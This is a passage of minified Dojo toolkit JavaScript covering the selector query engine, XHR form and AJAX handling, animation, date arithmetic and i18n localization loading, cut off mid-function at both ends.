t=e.trim,o=e.forEach,r=e._NodeListCtor=e.NodeList,n=function(){return e.doc},i=(e.isWebKit||e.isMozilla)&&"BackCompat"==n().compatMode,a=">~+",s=!1,l=function(){return!0},d=function(e){a.indexOf(e.slice(-1))>=0?e+=" * ":e+=" ";for(var o,r=function(o,r){return t(e.slice(o,r))},n=[],i=-1,l=-1,d=-1,c=-1,u=-1,h=-1,p=-1,m="",f="",g=0,b=e.length,v=null,_=null,x=function(){h>=0&&(v.id=r(h,g).replace(/\\/g,""),h=-1),function(){if(p>=0){var e=p==g?null:r(p,g);v[a.indexOf(e)<0?"tag":"oper"]=e,p=-1}}(),u>=0&&(v.classes.push(r(u+1,g).replace(/\\/g,"")),u=-1)};m=f,f=e.charAt(g),g<b;g++)if("\\"!=m)if(v||(o=g,v={query:null,pseudos:[],attrs:[],classes:[],tag:null,oper:null,id:null,getTag:function(){return s?this.otag:this.tag}},p=g),i>=0){if("]"==f){_.attr?_.matchFor=r(d||i+1,g):_.attr=r(i+1,g);var j=_.matchFor;j&&('"'!=j.charAt(0)&&"'"!=j.charAt(0)||(_.matchFor=j.slice(1,-1))),v.attrs.push(_),_=null,i=d=-1}else if("="==f){var y="|~^$*".indexOf(m)>=0?m:"";_.type=y+f,_.attr=r(i+1,g-y.length),d=g+1}}else l>=0?")"==f&&(c>=0&&(_.value=r(l+1,g)),c=l=-1):"#"==f?(x(),h=g+1):"."==f?(x(),u=g):":"==f?(x(),c=g):"["==f?(x(),i=g,_={}):"("==f?(c>=0&&(_={name:r(c+1,g),value:null},v.pseudos.push(_)),l=g):" "==f&&m!=f&&(x(),c>=0&&v.pseudos.push({name:r(c+1,g)}),v.loops=v.pseudos.length||v.attrs.length||v.classes.length,v.oquery=v.query=r(o,g),v.otag=v.tag=v.oper?null:v.tag||"*",v.tag&&(v.tag=v.tag.toUpperCase()),n.length&&n[n.length-1].oper&&(v.infixOper=n.pop(),v.query=v.infixOper.query+" "+v.query),n.push(v),v=null);return n},c=function(e,t){return e?t?function(){return e.apply(window,arguments)&&t.apply(window,arguments)}:e:t},u=function(e,t){var o=t||[];return e&&o.push(e),o},h=function(e){return 1==e.nodeType},p=function(e,t){return e?"class"==t?e.className||"":"for"==t?e.htmlFor||"":"style"==t?e.style.cssText||"":(s?e.getAttribute(t):e.getAttribute(t,2))||"":""},m={"*=":function(e,t){return function(o){return p(o,e).indexOf(t)>=0}},"^=":function(e,t){return function(o){return 0==p(o,e).indexOf(t)}},"$=":function(e,t){return function(o){var r=" "+p(o,e);return r.lastIndexOf(t)==r.length-t.length}},"~=":function(e,t){var o=" "+t+" ";return function(t){return(" "+p(t,e)+" ").indexOf(o)>=0}},"|=":function(e,t){var o=" "+t+"-";return function(r){var n=" "+p(r,e);return n==t||0==n.indexOf(o)}},"=":function(e,t){return function(o){return p(o,e)==t}}},f=void 0===n().firstChild.nextElementSibling,g=f?"nextSibling":"nextElementSibling",b=f?"previousSibling":"previousElementSibling",v=f?h:l,_=function(e){for(;e=e[b];)if(v(e))return!1;return!0},x=function(e){for(;e=e[g];)if(v(e))return!1;return!0},j=function(e){var t=e.parentNode,o=0,r=t.children||t.childNodes,n=e._i||-1,i=t._l||-1;if(!r)return-1;var a=r.length;if(i==a&&n>=0&&i>=0)return n;t._l=a,n=-1;for(var s=t.firstElementChild||t.firstChild;s;s=s[g])v(s)&&(s._i=++o,e===s&&(n=o));return n},y=function(e){return!(j(e)%2)},w=function(e){return j(e)%2},E={checked:function(e,t){return function(e){return!!("checked"in e?e.checked:e.selected)}},"first-child":function(){return _},"last-child":function(){return x},"only-child":function(e,t){return function(e){return!!_(e)&&!!x(e)}},empty:function(e,t){return function(e){for(var t=e.childNodes,o=e.childNodes.length-1;o>=0;o--){var r=t[o].nodeType;if(1===r||3==r)return!1}return!0}},contains:function(e,t){var o=t.charAt(0);return'"'!=o&&"'"!=o||(t=t.slice(1,-1)),function(e){return e.innerHTML.indexOf(t)>=0}},not:function(e,t){var o=d(t)[0],r={el:1};"*"!=o.tag&&(r.tag=1),o.classes.length||(r.classes=1);var n=A(o,r);return function(e){return!n(e)}},"nth-child":function(e,t){var o=parseInt;if("odd"==t)return w;if("even"==t)return y;if(-1!=t.indexOf("n")){var r=t.split("n",2),n=r[0]?"-"==r[0]?-1:o(r[0]):1,i=r[1]?o(r[1]):0,a=0,s=-1;if(n>0?i<0?i=i%n&&n+i%n:i>0&&(i>=n&&(a=i-i%n),i%=n):n<0&&(n*=-1,i>0&&(s=i,i%=n)),n>0)return function(e){var t=j(e);return t>=a&&(s<0||t<=s)&&t%n==i};t=i}var l=o(t);return function(e){return j(e)==l}}},S=e.isIE<9||dojo.isIE&&dojo.isQuirks?function(e){var t=e.toLowerCase();return"class"==t&&(e="className"),function(o){return s?o.getAttribute(e):o[e]||o[t]}}:function(e){return function(t){return t&&t.getAttribute&&t.hasAttribute(e)}},A=function(e,t){if(!e)return l;var r=null;return"el"in(t=t||{})||(r=c(r,h)),"tag"in t||"*"!=e.tag&&(r=c(r,(function(t){return t&&t.tagName==e.getTag()}))),"classes"in t||o(e.classes,(function(e,t,o){var n=new RegExp("(?:^|\\s)"+e+"(?:\\s|$)");(r=c(r,(function(e){return n.test(e.className)}))).count=t})),"pseudos"in t||o(e.pseudos,(function(e){var t=e.name;E[t]&&(r=c(r,E[t](t,e.value)))})),"attrs"in t||o(e.attrs,(function(e){var t,o=e.attr;e.type&&m[e.type]?t=m[e.type](o,e.matchFor):o.length&&(t=S(o)),t&&(r=c(r,t))})),"id"in t||e.id&&(r=c(r,(function(t){return!!t&&t.id==e.id}))),r||"default"in t||(r=l),r},P={},R=function(t){var o=P[t.query];if(o)return o;var r,a,s,d=t.infixOper,c=d?d.oper:"",p=A(t,{el:1}),m="*"==t.tag,b=n().getElementsByClassName;if(c){var _={el:1};m&&(_.tag=1),p=A(t,_),"+"==c?(s=p,o=function(e,t,o){for(;e=e[g];)if(!f||h(e)){o&&!W(e,o)||!s(e)||t.push(e);break}return t}):"~"==c?(a=p,o=function(e,t,o){for(var r=e[g];r;){if(v(r)){if(o&&!W(r,o))break;a(r)&&t.push(r)}r=r[g]}return t}):">"==c&&(r=(r=p)||l,o=function(e,t,o){for(var n,i=0,a=e.children||e.childNodes;n=a[i++];)v(n)&&(!o||W(n,o))&&r(n,i)&&t.push(n);return t})}else if(t.id)p=!t.loops&&m?l:A(t,{el:1,id:1}),o=function(o,r){var n=e.byId(t.id,o.ownerDocument||o);if(n&&p(n))return 9==o.nodeType||function(e,t){for(var o=e.parentNode;o&&o!=t;)o=o.parentNode;return!!o}(n,o)?u(n,r):void 0};else if(b&&/\{\s*\[native code\]\s*\}/.test(String(b))&&t.classes.length&&!i){p=A(t,{el:1,classes:1,id:1});var x=t.classes.join(" ");o=function(e,t,o){for(var r,n=u(0,t),i=0,a=e.getElementsByClassName(x);r=a[i++];)p(r,e)&&W(r,o)&&n.push(r);return n}}else m||t.loops?(p=A(t,{el:1,tag:1,id:1}),o=function(e,o,r){for(var n,i=u(0,o),a=0,s=e.getElementsByTagName(t.getTag());n=s[a++];)p(n,e)&&W(n,r)&&i.push(n);return i}):o=function(e,o,r){for(var n,i=u(0,o),a=0,s=e.getElementsByTagName(t.getTag());n=s[a++];)W(n,r)&&i.push(n);return i};return P[t.query]=o},T={},O={},C=function(e){var o=d(t(e));if(1==o.length){var n=R(o[0]);return function(e){var t=n(e,new r);return t&&(t.nozip=!0),t}}return function(e){return function(e,t){for(var o,r,n,i,a=u(e),s=t.length,l=0;l<s;l++){i=[],o=t[l],a.length-1>0&&(n={},i.nozip=!0);for(var d=R(o),c=0;r=a[c];c++)d(r,i,n);if(!i.length)break;a=i}return i}(e,o)}},M=navigator.userAgent,N="WebKit/",I=e.isWebKit&&M.indexOf(N)>0&&parseFloat(M.split(N)[1])>528,D=e.isIE?"commentStrip":"nozip",L="querySelectorAll",k=!!n()[L]&&(!e.isSafari||e.isSafari>3.1||I),U=/n\+\d|([^ ])?([>~+])([^ =])?/g,X=function(e,t,o,r){return o?(t?t+" ":"")+o+(r?" "+r:""):e},F=function(t,o){if(t=t.replace(U,X),k){var r=O[t];if(r&&!o)return r}var n=T[t];if(n)return n;var s=t.charAt(0),l=-1==t.indexOf(" ");if(t.indexOf("#")>=0&&l&&(o=!0),k&&!o&&-1==a.indexOf(s)&&(!e.isIE||-1==t.indexOf(":"))&&!(i&&t.indexOf(".")>=0)&&-1==t.indexOf(":contains")&&-1==t.indexOf(":checked")&&-1==t.indexOf("|=")){var d=a.indexOf(t.charAt(t.length-1))>=0?t+" *":t;return O[t]=function(e){try{if(9!=e.nodeType&&!l)throw"";var o=e[L](d);return o[D]=!0,o}catch(o){return F(t,!0)(e)}}}var c=t.split(/\s*,\s*/);return T[t]=c.length<2?C(t):function(e){for(var t,o=0,r=[];t=c[o++];)r=r.concat(C(t)(e));return r}},q=0,H=e.isIE?function(e){return s?e.getAttribute("_uid")||e.setAttribute("_uid",++q)||q:e.uniqueID}:function(e){return e._uid||(e._uid=++q)},W=function(e,t){if(!t)return 1;var o=H(e);return t[o]?0:t[o]=1},B="_zipIdx";e.query=function(t,o){if(r=e._NodeListCtor,!t)return new r;if(t.constructor==r)return t;if("string"!=typeof t)return new r(t);if("string"==typeof o&&!(o=e.byId(o)))return new r;var i=(o=o||n()).ownerDocument||o.documentElement;s=o.contentType&&"application/xml"==o.contentType||e.isOpera&&(o.doctype||"[object XMLDocument]"==i.toString())||!!i&&(e.isIE?i.xml:o.xmlVersion||i.xmlVersion);var a=F(t)(o);return a&&a.nozip&&!r._wrap?a:function(t){if(t&&t.nozip)return r._wrap?r._wrap(t):t;var o=new r;if(!t||!t.length)return o;if(t[0]&&o.push(t[0]),t.length<2)return o;if(q++,e.isIE&&s){var n=q+"";t[0].setAttribute(B,n);for(var i=1;a=t[i];i++)t[i].getAttribute(B)!=n&&o.push(a),a.setAttribute(B,n)}else if(e.isIE&&t.commentStrip)try{for(i=1;a=t[i];i++)h(a)&&o.push(a)}catch(e){}else{var a;for(t[0]&&(t[0][B]=q),i=1;a=t[i];i++)t[i][B]!=q&&o.push(a),a[B]=q}return o}(a)},e.query.pseudos=E,e._filterQueryResult=function(t,o){for(var r,n=new e._NodeListCtor,i=A(d(o)[0]),a=0;r=t[a];a++)i(r)&&n.push(r);return n}}(this.queryPortability||this.acme||dojo)),dojo._hasResource["dojo._base.xhr"]||(dojo._hasResource["dojo._base.xhr"]=!0,dojo.provide("dojo._base.xhr"),function(){var e=dojo,t=e.config;dojo.fieldToObject=function(t){var o=null,r=e.byId(t);if(r){var n=r.name,i=(r.type||"").toLowerCase();n&&i&&!r.disabled&&("radio"==i||"checkbox"==i?r.checked&&(o=r.value):r.multiple?(o=[],e.query("option",r).forEach((function(e){e.selected&&o.push(e.value)}))):o=r.value)}return o},dojo.formToObject=function(t){var o={};return e.forEach(dojo.byId(t).elements,(function(t){var r=t.name,n=(t.type||"").toLowerCase();r&&n&&-1=="file|submit|image|reset|button|".indexOf(n)&&!t.disabled&&(!function(t,o,r){if(null!==r){var n=t[o];"string"==typeof n?t[o]=[n,r]:e.isArray(n)?n.push(r):t[o]=r}}(o,r,e.fieldToObject(t)),"image"==n&&(o[r+".x"]=o[r+".y"]=o[r].x=o[r].y=0))})),o},dojo.objectToQuery=function(t){var o=encodeURIComponent,r=[],n={};for(var i in t){var a=t[i];if(a!=n[i]){var s=o(i)+"=";if(e.isArray(a))for(var l=0;l<a.length;l++)r.push(s+o(a[l]));else r.push(s+o(a))}}return r.join("&")},dojo.formToQuery=function(t){return e.objectToQuery(e.formToObject(t))},dojo.formToJson=function(t,o){return e.toJson(e.formToObject(t),o)},dojo.queryToObject=function(t){var o={},r=t.split("&"),n=decodeURIComponent;return e.forEach(r,(function(t){if(t.length){var r=t.split("="),i=n(r.shift()),a=n(r.join("="));"string"==typeof o[i]&&(o[i]=[o[i]]),e.isArray(o[i])?o[i].push(a):o[i]=a}})),o},dojo._blockAsync=!1;var o=e._contentHandlers=dojo.contentHandlers={text:function(e){return e.responseText},json:function(t){return e.fromJson(t.responseText||null)},"json-comment-filtered":function(t){dojo.config.useCommentedJson||console.warn("Consider using the standard mimetype:application/json. json-commenting can introduce security issues. To decrease the chances of hijacking, use the standard the 'json' handler and prefix your json with: {}&&\nUse djConfig.useCommentedJson=true to turn off this message.");var o=t.responseText,r=o.indexOf("/*"),n=o.lastIndexOf("*/");if(-1==r||-1==n)throw new Error("JSON was not comment filtered");return e.fromJson(o.substring(r+2,n))},javascript:function(t){return e.eval(t.responseText)},xml:function(t){var o=t.responseXML;if(e.isIE&&(!o||!o.documentElement)){var r=function(e){return"MSXML"+e+".DOMDocument"},n=["Microsoft.XMLDOM",r(6),r(4),r(3),r(2)];e.some(n,(function(e){try{var r=new ActiveXObject(e);r.async=!1,r.loadXML(t.responseText),o=r}catch(e){return!1}return!0}))}return o},"json-comment-optional":function(e){return e.responseText&&/^[^{\[]*\/\*/.test(e.responseText)?o["json-comment-filtered"](e):o.json(e)}};dojo._ioSetArgs=function(o,r,n,i){var a={args:o,url:o.url},s=null;if(o.form){var l=e.byId(o.form),d=l.getAttributeNode("action");a.url=a.url||(d?d.value:null),s=e.formToObject(l)}var c=[{}];s&&c.push(s),o.content&&c.push(o.content),o.preventCache&&c.push({"dojo.preventCache":(new Date).valueOf()}),a.query=e.objectToQuery(e.mixin.apply(null,c)),a.handleAs=o.handleAs||"text";var u=new e.Deferred(r);u.addCallbacks(n,(function(e){return i(e,u)}));var h=o.load;h&&e.isFunction(h)&&u.addCallback((function(e){return h.call(o,e,a)}));var p=o.error;p&&e.isFunction(p)&&u.addErrback((function(e){return p.call(o,e,a)}));var m=o.handle;return m&&e.isFunction(m)&&u.addBoth((function(e){return m.call(o,e,a)})),t.ioPublish&&e.publish&&!1!==a.args.ioPublish&&(u.addCallbacks((function(t){return e.publish("/dojo/io/load",[u,t]),t}),(function(t){return e.publish("/dojo/io/error",[u,t]),t})),u.addBoth((function(t){return e.publish("/dojo/io/done",[u,t]),t}))),u.ioArgs=a,u};var r=function(e){e.canceled=!0;var t=e.ioArgs.xhr,o=typeof t.abort;"function"!=o&&"object"!=o&&"unknown"!=o||t.abort();var r=e.ioArgs.error;return r||((r=new Error("xhr cancelled")).dojoType="cancel"),r},n=function(e){var t=o[e.ioArgs.handleAs](e.ioArgs.xhr);return void 0===t?null:t},i=function(e,t){return t.ioArgs.args.failOk||console.error(e),e},a=null,s=[],l=0,d=function(){var o=(new Date).getTime();if(!e._blockAsync)for(var r,n=0;n<s.length&&(r=s[n]);n++){var i=r.dfd,d=function(){if(i&&!i.canceled&&r.validCheck(i)){if(r.ioCheck(i))s.splice(n--,1),r.resHandle(i),l-=1;else if(i.startTime&&i.startTime+(i.ioArgs.args.timeout||0)<o){s.splice(n--,1);var e=new Error("timeout exceeded");e.dojoType="timeout",i.errback(e),i.cancel(),l-=1}}else s.splice(n--,1),l-=1};if(dojo.config.debugAtAllCosts)d.call(this);else try{d.call(this)}catch(e){i.errback(e)}}if(function(o){l<=0&&(l=0,t.ioPublish&&e.publish&&(!o||o&&!1!==o.ioArgs.args.ioPublish)&&e.publish("/dojo/io/stop"))}(i),!s.length)return clearInterval(a),void(a=null)};dojo._ioCancelAll=function(){try{e.forEach(s,(function(e){try{e.dfd.cancel()}catch(e){}}))}catch(e){}},e.isIE&&e.addOnWindowUnload(e._ioCancelAll),e._ioNotifyStart=function(o){t.ioPublish&&e.publish&&!1!==o.ioArgs.args.ioPublish&&(l||e.publish("/dojo/io/start"),l+=1,e.publish("/dojo/io/send",[o]))},e._ioWatch=function(e,t,o,r){var n=e.ioArgs.args;n.timeout&&(e.startTime=(new Date).getTime()),s.push({dfd:e,validCheck:t,ioCheck:o,resHandle:r}),a||(a=setInterval(d,50)),n.sync&&d()};var c=function(e){return e.ioArgs.xhr.readyState},u=function(e){return 4==e.ioArgs.xhr.readyState},h=function(t){var o=t.ioArgs.xhr;if(e._isDocumentOk(o))t.callback(t);else{var r=new Error("Unable to load "+t.ioArgs.url+" status:"+o.status);r.status=o.status,r.responseText=o.responseText,t.errback(r)}};dojo._ioAddQueryToUrl=function(e){e.query.length&&(e.url+=(-1==e.url.indexOf("?")?"?":"&")+e.query,e.query=null)},dojo.xhr=function(t,o,a){var s=e._ioSetArgs(o,r,n,i),l=s.ioArgs,d=l.xhr=e._xhrObj(l.args);if(!d)return s.cancel(),s;if("postData"in o?l.query=o.postData:"putData"in o?l.query=o.putData:"rawBody"in o?l.query=o.rawBody:(arguments.length>2&&!a||-1=="POST|PUT".indexOf(t.toUpperCase()))&&e._ioAddQueryToUrl(l),d.open(t,l.url,!0!==o.sync,o.user||void 0,o.password||void 0),o.headers)for(var p in o.headers)"content-type"!==p.toLowerCase()||o.contentType?o.headers[p]&&d.setRequestHeader(p,o.headers[p]):o.contentType=o.headers[p];if(d.setRequestHeader("Content-Type",o.contentType||"application/x-www-form-urlencoded"),o.headers&&"X-Requested-With"in o.headers||d.setRequestHeader("X-Requested-With","XMLHttpRequest"),e._ioNotifyStart(s),dojo.config.debugAtAllCosts)d.send(l.query);else try{d.send(l.query)}catch(e){l.error=e,s.cancel()}return e._ioWatch(s,c,u,h),d=null,s},dojo.xhrGet=function(t){return e.xhr("GET",t)},dojo.rawXhrPost=dojo.xhrPost=function(t){return e.xhr("POST",t,!0)},dojo.rawXhrPut=dojo.xhrPut=function(t){return e.xhr("PUT",t,!0)},dojo.xhrDelete=function(t){return e.xhr("DELETE",t)}}()),dojo._hasResource["dojo._base.fx"]||(dojo._hasResource["dojo._base.fx"]=!0,dojo.provide("dojo._base.fx"),function(){var e=dojo,t=e._mixin;dojo._Line=function(e,t){this.start=e,this.end=t},dojo._Line.prototype.getValue=function(e){return(this.end-this.start)*e+this.start},dojo.Animation=function(o){t(this,o),e.isArray(this.curve)&&(this.curve=new e._Line(this.curve[0],this.curve[1]))},e._Animation=e.Animation,e.extend(dojo.Animation,{duration:350,repeat:0,rate:20,_percent:0,_startRepeatCount:0,_getStep:function(){var e=this._percent,t=this.easing;return t?t(e):e},_fire:function(t,o){var r=o||[];if(this[t])if(e.config.debugAtAllCosts)this[t].apply(this,r);else try{this[t].apply(this,r)}catch(e){console.error("exception in animation handler for:",t),console.error(e)}return this},play:function(e,t){var o=this;if(o._delayTimer&&o._clearTimer(),t)o._stopTimer(),o._active=o._paused=!1,o._percent=0;else if(o._active&&!o._paused)return o;o._fire("beforeBegin",[o.node]);var r=e||o.delay,n=dojo.hitch(o,"_play",t);return r>0?(o._delayTimer=setTimeout(n,r),o):(n(),o)},_play:function(e){var t=this;t._delayTimer&&t._clearTimer(),t._startTime=(new Date).valueOf(),t._paused&&(t._startTime-=t.duration*t._percent),t._endTime=t._startTime+t.duration,t._active=!0,t._paused=!1;var o=t.curve.getValue(t._getStep());return t._percent||(t._startRepeatCount||(t._startRepeatCount=t.repeat),t._fire("onBegin",[o])),t._fire("onPlay",[o]),t._cycle(),t},pause:function(){var e=this;return e._delayTimer&&e._clearTimer(),e._stopTimer(),e._active?(e._paused=!0,e._fire("onPause",[e.curve.getValue(e._getStep())]),e):e},gotoPercent:function(e,t){var o=this;return o._stopTimer(),o._active=o._paused=!0,o._percent=e,t&&o.play(),o},stop:function(e){var t=this;return t._delayTimer&&t._clearTimer(),t._timer?(t._stopTimer(),e&&(t._percent=1),t._fire("onStop",[t.curve.getValue(t._getStep())]),t._active=t._paused=!1,t):t},status:function(){return this._active?this._paused?"paused":"playing":"stopped"},_cycle:function(){var e=this;if(e._active){var t=((new Date).valueOf()-e._startTime)/(e._endTime-e._startTime);t>=1&&(t=1),e._percent=t,e.easing&&(t=e.easing(t)),e._fire("onAnimate",[e.curve.getValue(t)]),e._percent<1?e._startTimer():(e._active=!1,e.repeat>0?(e.repeat--,e.play(null,!0)):-1==e.repeat?e.play(null,!0):e._startRepeatCount&&(e.repeat=e._startRepeatCount,e._startRepeatCount=0),e._percent=0,e._fire("onEnd",[e.node]),!e.repeat&&e._stopTimer())}return e},_clearTimer:function(){clearTimeout(this._delayTimer),delete this._delayTimer}});var o=0,r=null,n={run:function(){}};e.extend(e.Animation,{_startTimer:function(){this._timer||(this._timer=e.connect(n,"run",this,"_cycle"),o++),r||(r=setInterval(e.hitch(n,"run"),this.rate))},_stopTimer:function(){this._timer&&(e.disconnect(this._timer),this._timer=null,o--),o<=0&&(clearInterval(r),r=null,o=0)}});var i=e.isIE?function(t){var o=t.style;o.width.length||"auto"!=e.style(t,"width")||(o.width="auto")}:function(){};dojo._fade=function(o){o.node=e.byId(o.node);var r=t({properties:{}},o),n=r.properties.opacity={};n.start="start"in r?r.start:function(){return+e.style(r.node,"opacity")||0},n.end=r.end;var a=e.animateProperty(r);return e.connect(a,"beforeBegin",e.partial(i,r.node)),a},dojo.fadeIn=function(o){return e._fade(t({end:1},o))},dojo.fadeOut=function(o){return e._fade(t({end:0},o))},dojo._defaultEasing=function(e){return.5+Math.sin((e+1.5)*Math.PI)/2};var a=function(t){for(var o in this._properties=t,t){var r=t[o];r.start instanceof e.Color&&(r.tempColor=new e.Color)}};a.prototype.getValue=function(t){var o={};for(var r in this._properties){var n=this._properties[r],i=n.start;i instanceof e.Color?o[r]=e.blendColors(i,n.end,t,n.tempColor).toCss():e.isArray(i)||(o[r]=(n.end-i)*t+i+("opacity"!=r?n.units||"px":0))}return o},dojo.animateProperty=function(o){var r=o.node=e.byId(o.node);o.easing||(o.easing=e._defaultEasing);var n=new e.Animation(o);return e.connect(n,"beforeBegin",n,(function(){var o={};for(var n in this.properties){"width"!=n&&"height"!=n||(this.node.display="block");var i=this.properties[n];e.isFunction(i)&&(i=i(r)),i=o[n]=t({},e.isObject(i)?i:{end:i}),e.isFunction(i.start)&&(i.start=i.start(r)),e.isFunction(i.end)&&(i.end=i.end(r));var s=n.toLowerCase().indexOf("color")>=0;function l(t,o){var r={height:t.offsetHeight,width:t.offsetWidth}[o];return void 0!==r?r:(r=e.style(t,o),"opacity"==o?+r:s?r:parseFloat(r))}"end"in i?"start"in i||(i.start=l(r,n)):i.end=l(r,n),s?(i.start=new e.Color(i.start),i.end=new e.Color(i.end)):i.start="opacity"==n?+i.start:parseFloat(i.start)}this.curve=new a(o)})),e.connect(n,"onAnimate",e.hitch(e,"style",n.node)),n},dojo.anim=function(t,o,r,n,i,a){return e.animateProperty({node:t,duration:r||e.Animation.prototype.duration,properties:o,easing:n,onEnd:i}).play(a||0)}}()),dojo._hasResource["dojo._base.browser"]||(dojo._hasResource["dojo._base.browser"]=!0,dojo.provide("dojo._base.browser"),dojo.forEach(dojo.config.require,(function(e){dojo.require(e)}))),dojo._hasResource["dojo.date"]||(dojo._hasResource["dojo.date"]=!0,dojo.provide("dojo.date"),dojo.date.getDaysInMonth=function(e){var t=e.getMonth();return 1==t&&dojo.date.isLeapYear(e)?29:[31,28,31,30,31,30,31,31,30,31,30,31][t]},dojo.date.isLeapYear=function(e){var t=e.getFullYear();return!(t%400&&(t%4||!(t%100)))},dojo.date.getTimezoneName=function(e){var t,o=e.toString(),r="",n=o.indexOf("(");if(n>-1)r=o.substring(++n,o.indexOf(")"));else{var i=/([A-Z\/]+) \d{4}$/;(t=o.match(i))?r=t[1]:(i=/ ([A-Z\/]+)$/,(t=(o=e.toLocaleString()).match(i))&&(r=t[1]))}return"AM"==r||"PM"==r?"":r},dojo.date.compare=function(e,t,o){return e=new Date(+e),t=new Date(+(t||new Date)),"date"==o?(e.setHours(0,0,0,0),t.setHours(0,0,0,0)):"time"==o&&(e.setFullYear(0,0,0),t.setFullYear(0,0,0)),e>t?1:e<t?-1:0},dojo.date.add=function(e,t,o){var r=new Date(+e),n=!1,i="Date";switch(t){case"day":break;case"weekday":var a,s,l=o%5;l?(a=l,s=parseInt(o/5)):(a=o>0?5:-5,s=o>0?(o-5)/5:(o+5)/5);var d=e.getDay(),c=0;6==d&&o>0?c=1:0==d&&o<0&&(c=-1);var u=d+a;0!=u&&6!=u||(c=o>0?2:-2),o=7*s+a+c;break;case"year":i="FullYear",n=!0;break;case"week":o*=7;break;case"quarter":o*=3;case"month":n=!0,i="Month";break;default:i="UTC"+t.charAt(0).toUpperCase()+t.substring(1)+"s"}return i&&r["set"+i](r["get"+i]()+o),n&&r.getDate()<e.getDate()&&r.setDate(0),r},dojo.date.difference=function(e,t,o){o=o||"day";var r=(t=t||new Date).getFullYear()-e.getFullYear(),n=1;switch(o){case"quarter":var i=e.getMonth(),a=t.getMonth(),s=Math.floor(i/3)+1,l=Math.floor(a/3)+1;n=(l+=4*r)-s;break;case"weekday":var d=Math.round(dojo.date.difference(e,t,"day")),c=parseInt(dojo.date.difference(e,t,"week")),u=d%7;if(0==u)d=5*c;else{var h=0,p=e.getDay(),m=t.getDay();c=parseInt(d/7),u=d%7;var f=new Date(e);f.setDate(f.getDate()+7*c);var g=f.getDay();if(d>0)switch(!0){case 6==p:h=-1;break;case 0==p:h=0;break;case 6==m:h=-1;break;case 0==m:case g+u>5:h=-2}else if(d<0)switch(!0){case 6==p:h=0;break;case 0==p:h=1;break;case 6==m:h=2;break;case 0==m:h=1;break;case g+u<0:h=2}d+=h,d-=2*c}n=d;break;case"year":n=r;break;case"month":n=t.getMonth()-e.getMonth()+12*r;break;case"week":n=parseInt(dojo.date.difference(e,t,"day")/7);break;case"day":n/=24;case"hour":n/=60;case"minute":n/=60;case"second":n/=1e3;case"millisecond":n*=t.getTime()-e.getTime()}return Math.round(n)}),dojo._hasResource["dojo.i18n"]||(dojo._hasResource["dojo.i18n"]=!0,dojo.provide("dojo.i18n"),dojo.i18n.getLocalization=function(e,t,o){var r=(o=dojo.i18n.normalizeLocale(o)).split("-"),n=[e,"nls",t].join("."),i=dojo._loadedModules[n];if(i){for(var a,s=r.length;s>0;s--){var l=r.slice(0,s).join("_");if(i[l]){a=i[l];break}}if(a||(a=i.ROOT),a){var d=function(){};return d.prototype=a,new d}}throw new Error("Bundle not found: "+t+" in "+e+" , locale="+o)},dojo.i18n.normalizeLocale=function(e){var t=e?e.toLowerCase():dojo.locale;return"root"==t&&(t="ROOT"),t},dojo.i18n._requireLocalization=function(e,t,o,r){var n=dojo.i18n.normalizeLocale(o),i=[e,"nls",t].join("."),a="";if(r){for(var s=r.split(","),l=0;l<s.length;l++)0==n.indexOf(s[l])&&s[l].length>a.length&&(a=s[l]);a||(a="ROOT")}var d=r?a:n,c=dojo._loadedModules[i],u=null;if(c){if(dojo.config.localizationComplete&&c._built)return;var h=d.replace(/-/g,"_"),p=i+"."+h;u=dojo._loadedModules[p]}if(!u){c=dojo.provide(i);var m,f=dojo._getModuleSymbols(e).concat("nls").join("/");dojo.i18n._searchLocalePath(d,r,(function(e){var o=e.replace(/-/g,"_"),n=i+"."+o,a=!1;if(dojo._loadedModules[n])a=!0;else{dojo.provide(n);var s=[f];"ROOT"!=e&&s.push(e),s.push(t);var l=s.join("/")+".js";a=dojo._loadPath(l,null,(function(e){var t=function(){};for(var r in t.prototype=m,c[o]=new t,e)c[o][r]=e[r]}))}if(a&&c[o]?m=c[o]:c[o]=m,r)return!0}))}r&&n!=a&&(c[n.replace(/-/g,"_")]=c[a.replace(/-/g,"_")])},function(){var e=dojo.config.extraLocale;if(e){!e instanceof Array&&(e=[e]);var t=dojo.i18n._requireLocalization;dojo.i18n._requireLocalization=function(o,r,n,i){if(t(o,r,n,i),!n)for(var a=0;a<e.length;a++)t(o,r,e[a],i)}}}(),dojo.i18n._searchLocalePath=function(e,t,o){for(var r=(e=dojo.i18n.normalizeLocale(e)).split("-"),n=[],i=r.length;i>0;i--)n.push(r.slice(0,i).join("-"));n.push(!1),t&&n.reverse();for(var a=n.length-1;a>=0;a--){if(o(n[a]||"ROOT"))break}},dojo.i18n._preloadLocalizations=function(e,t){function o(o){o=dojo.i18n.normalizeLocale(o),dojo.i18n._searchLocalePath(o,!0,(function(o){for(var r=0;r<t.length;r++)if(t[r]==o)return dojo.require(e+"_"+o),!0;return!1}))}o();for(var r=dojo.config.extraLocale||[],n=0;n<r.length;n++)o(r[n])}),dojo._hasResource["dojo.cldr.supplemental"]||(dojo._hasResource["dojo.cldr.supplemental"]=!0,dojo.provide("dojo.cldr.supplemental"),dojo.cldr.supplemental.getFirstDayOfWeek=function(e){var t={mv:5,ae:6,af:6,bh:6,dj:6,dz:6,eg:6,er:6,et:6,iq:6,ir:6,jo:6,ke:6,kw:6,lb:6,ly:6,ma:6,om:6,qa:6,sa:6,sd:6,so:6,tn:6,ye:6,as:0,au:0,az:0,bw:0,ca:0,cn:0,fo:0,ge:0,gl:0,gu:0,hk:0,ie:0,il:0,is:0,jm:0,jp:0,kg:0,kr:0,la:0,mh:0,mo:0,mp:0,mt:0,nz:0,ph:0,pk:0,sg:0,th:0,tt:0,tw:0,um:0,us:0,uz:0,vi:0,za:0,zw:0,et:0,mw:0,ng:0,tj:0,sy:4}[dojo.cldr.supplemental._region(e)];return void 0===t?1:t},dojo.cldr.supplemental._region=function(e){var t=(e=dojo.i18n.normalizeLocale(e)).split("-"),o=t[1];return o?4==o.length&&(o=t[2]):o={de:"de",en:"us",es:"es",fi:"fi",fr:"fr",he:"il",hu:"hu",it:"it",ja:"jp",ko:"kr",nl:"nl",pt:"br",sv:"se",zh:"cn"}[t[0]],o},dojo.cldr.supplemental.getWeekend=function(e){var 